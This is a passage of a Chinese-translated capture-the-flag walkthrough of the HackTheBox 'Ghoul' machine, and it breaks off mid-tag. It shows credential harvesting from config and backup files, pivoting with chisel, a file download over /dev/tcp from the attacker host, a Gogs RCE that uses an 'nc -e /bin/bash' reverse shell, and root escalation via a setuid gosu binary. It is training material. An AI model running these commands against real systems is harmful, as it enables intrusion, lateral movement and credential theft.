ka kb kc lz ke kf kg ma ki kj kk ij bi translated">枚举noro的目录，我看到一个待办文件。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ow"><img src="../Images/332576f5d06b0a42dd273c1b5217a316.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Lk3SS-J4KQWaqLP4x8D7dA.png"/></div></div></figure><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="4506" class="ml kz iq mh b gy mm mn l mo mp">root@Aogiri:/home/noro# cat to-do.txt <br/>Need to update backups.</span></pre><p id="a4c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好像还有备份。我枚举了var目录，并为3个用户的密钥找到了备份。我检查了pdf和xlsx文件，但我认为他们是兔子洞。</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="e663" class="ml kz iq mh b gy mm mn l mo mp">root@Aogiri:/var# ls<br/>backups  cache  docs  lib  local  lock  log  mail  opt  run  spool  tmp  www<br/>root@Aogiri:/var# cd backups/<br/>root@Aogiri:/var/backups# ls -alR<br/>.:<br/>total 24<br/>drwxr-xr-x 1 root root 4096 Dec 13  2018 .<br/>drwxr-xr-x 1 root root 4096 Dec 13  2018 ..<br/>drwxr-xr-x 1 root root 4096 Dec 13  2018 backups</span><span id="d67e" class="ml kz iq mh b gy oo mn l mo mp">./backups:<br/>total 3852<br/>drwxr-xr-x 1 root root    4096 Dec 13  2018 .<br/>drwxr-xr-x 1 root root    4096 Dec 13  2018 ..<br/>-rw-r--r-- 1 root root 3886432 Dec 13  2018 Important.pdf<br/>drwxr-xr-x 2 root root    4096 Dec 13  2018 keys<br/>-rw-r--r-- 1 root root     112 Dec 13  2018 note.txt<br/>-rw-r--r-- 1 root root   29380 Dec 13  2018 sales.xlsx</span><span id="4752" class="ml kz iq mh b gy oo mn l mo mp">./backups/keys:<br/>total 24<br/>drwxr-xr-x 2 root root 4096 Dec 13  2018 .<br/>drwxr-xr-x 1 root root 4096 Dec 13  2018 ..<br/>-rwxr--r-- 1 root root 1675 Dec 13  2018 eto.backup<br/>-rwxr--r-- 1 root root 1766 Dec 13  2018 kaneki.backup<br/>-rwxr--r-- 1 root root 1675 Dec 13  2018 noro.backup</span></pre><p id="da9a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正在检查这些备份文件是什么:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="10ac" class="ml kz iq mh b gy mm mn l mo mp">root@Aogiri:/var/backups/backups/keys# file *<br/>eto.backup:    PEM RSA private key<br/>kaneki.backup: PEM RSA private key<br/>noro.backup:   PEM RSA private key<br/>root@Aogiri:/var/backups/backups/keys#</span></pre><p id="e19e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它们是PEM RSA，可以使用命令和在login.php找到的密码将其转换为RSA私钥。但是我不需要这些文件，因为我已经可以访问它们的rsa私钥:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="578f" class="ml kz iq mh b gy mm mn l mo mp">openssl rsa -in <em class="ox">backupfile</em> -out <em class="ox">outputfile </em></span></pre><p id="1677" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我检查html文件夹。这些是端口80上的文件。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oy"><img src="../Images/70df00d8143c23d467674d562529999a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N8Df50XsxVquVe4tOsSqSA.png"/></div></div></figure><p id="4667" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我开始在http://10.10.10.101 url下检查这些文件。secret.php这个文件很有趣。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi op"><img src="../Images/91f6e10ffb73ca6fdc11e043cda52149.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BCuHGCtosqSAga_TA2TTmg.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">secret.php</figcaption></figure><p id="07fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我检查其他php文件，这是在http://10 . 10 . 10 . 101/users/log in . PHP下找到的login.php文件，我找到了<strong class="jp ir"> kaneki:123456 </strong>、<strong class="jp ir"> noro:password123 </strong>和<strong class="jp ir"> admin:abcdef </strong>的凭证。注意，在Noro说他需要访问远程服务器之后，Kaneki说了一个“<strong class="jp ir"> ILoveTouka </strong>”。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oz"><img src="../Images/481ee77f6f766ef2f47d1fa3e5fddf06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6838f3uCvrRHXVwmuC4rwQ.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">login.php</figcaption></figure><p id="fff9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这之后，我意识到我可能跳过了一些步骤，我尝试了在login.php文件上找到的密码，备份密钥文件可以使用除用户kaneki之外的密码解密。登录到/users/login.php会显示这个页面:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pa"><img src="../Images/f86919e16f58f9575ec22df919274045.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WAU0vt_Df0nixGbvCmoXig.png"/></div></div></figure><p id="7164" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查其他php文件，我发现没有什么有用的。然后我决定继续前进。</p><h2 id="4896" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">旋转到172.20.0.150:</h2><p id="91a6" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">然后我检查我的IP地址，看我在哪个子网:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/a1393ab2816faefbc39fd40f8137dc59.png" data-original-src="https://miro.medium.com/v2/resize:fit:1270/format:webp/1*V6pvMqD0TKDiV6P1YjuDJg.png"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">ifconfig</figcaption></figure><p id="5d74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我注意到我的IP地址是172.20.0.10。然后，我执行ping扫描来查看活动的主机。我发现一个新的IP地址是172.20.0.150。</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="91e7" class="ml kz iq mh b gy mm mn l mo mp">root@Aogiri:/# for ip in $(seq 1 254) ; do (ping -c 1 172.20.0.$ip | grep "bytes from"| cut -d':' -f1 | cut -d' ' -f4 &amp;); done<br/>172.20.0.1<br/>172.20.0.10<br/><strong class="mh ir">172.20.0.150</strong></span></pre><p id="4771" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我从这里上传了一个nmap静态二进制文件，这样我就可以枚举开放的端口。请注意，这也可以使用for循环来完成:</p><p id="37c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap" rel="noopener ugc nofollow" target="_blank">https://github . com/Andrew-d/static-binaries/blob/master/binaries/Linux/x86 _ 64/nmap</a></p><p id="5f2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用SCP将它上传到机器，并上传到tmp目录:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="fa94" class="ml kz iq mh b gy mm mn l mo mp">scp -i ghoul_htb nmap root@10.10.10.101:/tmp</span></pre><p id="333b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行nmap:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pc"><img src="../Images/76c48539560da45ff63f9d5ad49a7273.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2PBlt1k-4JmOFjiiImKpaw.png"/></div></div></figure><p id="a5df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，它会查找机器中不存在的文件。我可以选择复制/etc/services中的内容，或者执行SSH远程端口转发，这样我就可以从机器本地nmap主机。在发现SSH在172.20.0.150上是开放的之后，我查看了我的笔记，记得有一个来自kaneki-pc的kaneki_pub用户。然后，我尝试使用kaneki的私有密钥进行ssh，并使用字符串“ILoveTouka”作为密码，这是之前secrets.php文件中的内容，它成功了！</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pd"><img src="../Images/ac1260dc6e9308e8dc3271b403442498.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M8TiLTn2hqOXMc9wO6Hu5Q.png"/></div></div></figure><h2 id="cb1e" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">金木电脑</h2><p id="adf4" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">读取to-do.txt文件中的内容:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="decc" class="ml kz iq mh b gy mm mn l mo mp">kaneki_pub@kaneki-pc:~$ cat to-do.txt<br/>Give AogiriTest user access to Eto for git.</span></pre><p id="fd14" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我为git找到了另一个用户名<em class="ox"> AogiriTest </em>。</p><p id="802c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正在检查/home目录:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/07f3a54030486bd5cb1ced6633ba7e80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1172/format:webp/1*ARn8I-56EQ0HcDmIVkduPA.png"/></div></figure><p id="af9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我找到两个用户，<strong class="jp ir"> kaneki_adm </strong>和<strong class="jp ir"> kaneki_pub </strong>。</p><p id="be61" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我检查接口的配置:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pf"><img src="../Images/4022e20be0fc0a04c4b6fdef9b19e897.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PA4LkV8azQ0eVim6wTFDng.png"/></div></div></figure><p id="f571" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，eth1接口的ip地址为172.18.0.200。然后，我又运行了一次ping扫描，检查172.18.0网络上的主机。请注意，172.18.0.2上还有另一台主机。</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="195d" class="ml kz iq mh b gy mm mn l mo mp">kaneki_pub@kaneki-pc:~$ for ip in $(seq 1 254); do (ping -c 1 172.18.0.$ip | grep "bytes from" |cut -d ":" -f1 | cut -d " " -f4 &amp;) ; done<br/>172.18.0.1<br/><strong class="mh ir">172.18.0.2</strong><br/>172.18.0.200</span></pre><p id="e5e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我通过执行另一个SCP将nmap从Aogiri主机上传到kaneki-pc，并将其保存到tmp目录:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="b742" class="ml kz iq mh b gy mm mn l mo mp">scp -i /home/kaneki/.ssh/id_rsa nmap kaneki_pub@172.20.0.150:/tmp</span></pre><p id="ad87" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正在检查kaneki-pc的/tmp目录:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pg"><img src="../Images/6a9794163e3304d7eb75be2182f44d58.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Go3shaZQBnsNSUPn4SBCew.png"/></div></div></figure><p id="c30c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到nmap被转移了，还有一些奇怪的文件夹名字叫ssh-XXXXXXX。我继续我的nmap:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ph"><img src="../Images/88a5bebe23073bdc4f0043169bf7912b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_o0L0fS9DcrnT1x2VXjVoA.png"/></div></div></figure><p id="32ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在172.18.0.2上运行nmap，我找到了2个端口。注意我一直在等Gogs服务出来，Gogs服务一般运行在3000端口。</p><p id="481f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我试图检查端口3000给出了什么:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pi"><img src="../Images/aeb9eb12d8f6532ec827077655682d03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mnG1mryaRKBgzp1gHKgfYg.png"/></div></div></figure><p id="77eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以端口3000是Gogs服务器。知道有人提到了高格的RCE，我就去找RCE。我发现这个:</p><p id="e95b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://github.com/TheZ3ro/gogsownz" rel="noopener ugc nofollow" target="_blank">https://github.com/TheZ3ro/gogsownz</a></p><h2 id="9a01" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">隧道到172.18.0.2:</h2><p id="bd2b" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">由于我们无法从Kali机器访问172.18.0.2主机，并在容器上利用漏洞，于是我决定创建一个到172.18.0.2端口3000的隧道。因为我们没有Gogs服务器的ssh凭证，所以我使用chisel。</p><div class="nt nu gp gr nv nw"><a href="https://github.com/jpillora/chisel" rel="noopener  ugc nofollow" target="_blank"><div class="nx ab fo"><div class="ny ab nz cl cj oa"><h2 class="bd ir gy z fp ob fr fs oc fu fw ip bi translated">凿子/凿子</h2><div class="od l"><h3 class="bd b gy z fp ob fr fs oc fu fw dk translated">Chisel是一个快速的TCP隧道，通过HTTP传输，通过SSH保护。单一可执行文件，包括客户端和…</h3></div><div class="oe l"><p class="bd b dl z fp ob fr fs oc fu fw dk translated">github.com</p></div></div><div class="of l"><div class="pj l oh oi oj of ok ks nw"/></div></div></a></div><p id="c248" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我第一次知道凿子是在❤.的ippsec观看他在red上的精彩视频(他在视频中进行了大量的隧道挖掘)。如果你想要一份隧道挖掘的书面形式，你也可以参考这个:</p><p id="452f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html" rel="noopener ugc nofollow" target="_blank">https://0x df . git lab . io/2019/01/28/tunneling-with chisel-and-SSF . html</a></p><p id="2d9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回到过去，我首先在我的机器上下载了chisel二进制文件，并减少了二进制文件，以简化文件的传输(也有视频和关于如何做的文章)。</p><p id="493b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我首先将chisel二进制文件转移到kaneki-pc容器上:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/a29fbd431d0197ab6894de47100b6845.png" data-original-src="https://miro.medium.com/v2/resize:fit:1328/format:webp/1*zQekIdA1FWzLzxshLcLRew.png"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">凿子转移</figcaption></figure><p id="a67c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在转发172.18.0.2主机的端口3000。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pl"><img src="../Images/6624b59fab34705056bd1d757055f0db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*chBD-96p9V_-SAAwLKUdFA.png"/></div></div></figure><p id="5b19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基本上，我告诉chisel客户端(kaneki-pc)连接到我的chisel服务器(我的主机),任何发送到端口3001的流量将被转发到主机172.18.0.2上的端口3000。图表看起来像这样:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pm"><img src="../Images/bfaac2321a73a9deb1e959b99d61608d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gVQFyJUpdwqdKWda3V8sew.png"/></div></div></figure><p id="9739" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">绿线是chisel连接，红线表示发送到localhost 3001的任何流量都将被转发到Gogs服务器的端口3000。</p><p id="1133" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问本地主机:3001:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pi"><img src="../Images/73e25f805804ba583abfcff22a5354d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kxYuHsTqjvti0Z7ptbx8Pg.png"/></div></div></figure><p id="e4da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还不能尝试RCE，因为我没有AogiriTest用户的密码。我在Aogiri容器的/usr/share/Tomcat 7/conf/Tomcat-users . XML中枚举并找到了一个密码。</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="eeb2" class="ml kz iq mh b gy mm mn l mo mp">&lt;!--<br/>  &lt;role rolename="tomcat"/&gt;<br/>  &lt;role rolename="role1"/&gt;<br/>  &lt;user username="tomcat" password="&lt;must-be-changed&gt;" roles="tomcat"/&gt;<br/>  &lt;user username="both" password="&lt;must-be-changed&gt;" roles="tomcat,role1"/&gt; <br/>  &lt;user username="role1" password="&lt;must-be-changed&gt;" roles="role1"/&gt;<br/>--&gt;</span><span id="314e" class="ml kz iq mh b gy oo mn l mo mp">&lt;user username="admin" password="admin" roles="admin" /&gt;<br/>  &lt;role rolename="admin" /&gt;<br/>  &lt;!--&lt;user username="admin" password="<strong class="mh ir">test@aogiri123</strong>" roles="admin" /&gt;<br/>  &lt;role rolename="admin" /&gt;--&gt;<br/>&lt;/tomcat-users&gt;</span></pre><p id="2550" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我试着用这个密码登录Gogs服务，它成功了！</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pn"><img src="../Images/a920d7ff6641069def6d9a852c633063.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KY4xWZf_w_qit7EWRUQsjQ.png"/></div></div></figure><p id="b4a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在尝试RCE之前，我首先通过Burp调查身份验证是如何发送的:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi po"><img src="../Images/628024fd99618cec9eb95bc617deb158.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/1*31VRl_wjDYO6kjW6S7k2fQ.png"/></div></div></figure><p id="cdbf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意，它使用了cookie i_like_gogits，可以在RCE中使用。查看gogsownsz.py的帮助:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nd"><img src="../Images/67bcce92c7a6d5e92abf3db6b35337d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8XZ2gMZbuiU6vPUskCF_9w.png"/></div></div></figure><h2 id="f25b" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">Gogs上的反向外壳:</h2><p id="a2d9" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">由于Gogs服务器与我们的主机没有连接，所以我首先尝试将ncat的一个静态二进制文件上传到kaneki-pc，它会捕获shell。</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="d90f" class="ml kz iq mh b gy mm mn l mo mp">toor@CJ:~/ghoul$ nc -nlvp 9001 &lt; ncat<br/>Listening on [0.0.0.0] (family 0, port 9001)<br/>Connection from 10.10.10.101 38252 received!<br/>toor@CJ:~/ghoul$ md5sum ncat<br/>1b3b9f07acfe786081d4e52ad67e0983  ncat<br/></span><span id="ad32" class="ml kz iq mh b gy oo mn l mo mp">kaneki_pub@kaneki-pc:/tmp$ cat &lt; /dev/tcp/10.10.14.33/9001 &gt; ncat<br/>^C<br/>kaneki_pub@kaneki-pc:/tmp$ md5sum ncat<br/>1b3b9f07acfe786081d4e52ad67e0983  ncat<br/>kaneki_pub@kaneki-pc:/tmp$</span></pre><p id="c270" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我在kaneki-pc上有了ncat，我用语法尝试了RCE</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="b078" class="ml kz iq mh b gy mm mn l mo mp">python3 gogsownz.py <a class="ae kl" href="http://localhost:3000/" rel="noopener ugc nofollow" target="_blank">http://localhost:3000/</a> -v -C "AogiriTest:test@aogiri123" --rce "nc 172.18.0.2 9001 -e /bin/bash" -n i_like_gogits</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nn"><img src="../Images/89c1d3314ee7f6c3e2b39e64f96e58ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P4ATNhhwbMGjKTCmUC8M5g.png"/></div></div></figure><p id="810c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在在Gogs服务器上获得了一个shell！枚举，我看到我是Git用户。我通过调用以下命令快速检查设置了setuid的二进制文件:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="6a07" class="ml kz iq mh b gy mm mn l mo mp">find / -perm -u=s -type f 2&gt;/dev/null</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pp"><img src="../Images/fb93c9d18e471e82016791a52a6b4984.png" data-original-src="https://miro.medium.com/v2/resize:fit:1048/format:webp/1*NDyElZwV4oL1swQ3QF4Tbg.png"/></div></figure><p id="4777" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">/usr/sbin/gosu二进制文件非常突出。在网上查看后，我找到了这个知识库:</p><p id="b25c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">【https://github.com/tianon/gosu T4】</p><p id="e297" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查其用法:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pq"><img src="../Images/0e9449678dd72c7ed37d102f9a763cf0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*JIMFZyURvYUxy8aTmmj7wg.png"/></div></figure><p id="9305" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试以root用户身份运行命令，并看到它工作正常。我列出了/root/目录下的文件:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="1b11" class="ml kz iq mh b gy mm mn l mo mp"><br/>/usr/sbin/gosu root bash -c 'whoami'<br/>root</span><span id="412a" class="ml kz iq mh b gy oo mn l mo mp">/usr/sbin/gosu root bash -c 'ls -al /root/'<br/>total 128<br/>drwx------    1 root     root          4096 Dec 29  2018 .<br/>drwxr-xr-x    1 root     root          4096 Dec 13  2018 ..<br/>lrwxrwxrwx    1 root     root             9 Dec 29  2018 .ash_history -&gt; /dev/null<br/>lrwxrwxrwx    1 root     root             9 Dec 29  2018 .bash_history -&gt; /dev/null<br/>-rw-r--r--    1 root     root        117507 Dec 29  2018 aogiri-app.7z<br/>-rwxr-xr-x    1 root     root           179 Dec 16  2018 session.sh</span></pre><p id="f655" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到有一个有趣的7z文件，然后我将它导出到我的本地机器上。</p><h2 id="57f5" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">调查青鸟app</h2><p id="c947" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我首先运行git log并看到一些提交:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="996f" class="ml kz iq mh b gy mm mn l mo mp">git log </span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pr"><img src="../Images/e638ae62c08127f2bfa7d6480f150ca6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GYKRsPE38979B13P-AfAdA.png"/></div></div></figure><p id="618b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">枚举更多，以显示涉及指定路径的提交，以及内部相同指定路径的差异，我调用:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="32aa" class="ml kz iq mh b gy mm mn l mo mp">git log -p .</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ps"><img src="../Images/47c98c00cecbd758bfc441a2b66261ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_dGLgFLazramoEtUK3xnhg.png"/></div></div></figure><p id="43fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在看到了kaneki的密码。我试过到kaneki-pc提升为kaneki_adm和kaneki_pub，都不行。即使是对根来说。</p><p id="2c27" 